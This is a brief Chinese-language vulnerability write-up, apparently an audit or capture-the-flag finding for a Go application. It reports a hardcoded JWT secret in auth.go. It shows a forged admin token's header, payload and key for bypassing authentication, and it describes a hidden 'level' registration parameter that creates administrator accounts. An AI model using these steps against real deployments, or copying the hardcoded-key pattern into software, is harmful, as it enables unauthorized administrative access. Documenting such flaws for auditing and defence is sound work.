# jwt-key硬编码
auth.go的11行：
jwt-key:
```go
var secretKey string = "your-256-bit-very-secure-secret-key"
```
# 鉴权绕过

jwt-key硬编码，自行生成jwt-token，绕过限制

Header:
```json
{
"alg": "HS256",
"typ": "JWT"
}
```
Payload:
```json

{
"username": "admin",
"iss": "your-app-name",
"sub": "user-access",
"exp": 1749872097,
"nbf": 1749785697,
"iat": 1749785697
}
```
jwt-key:
```
your-256-bit-very-secure-secret-key
```
# 任意管理员账号注册

注册用户处，存在一个隐藏参数level，赋值1，即可注册管理员账户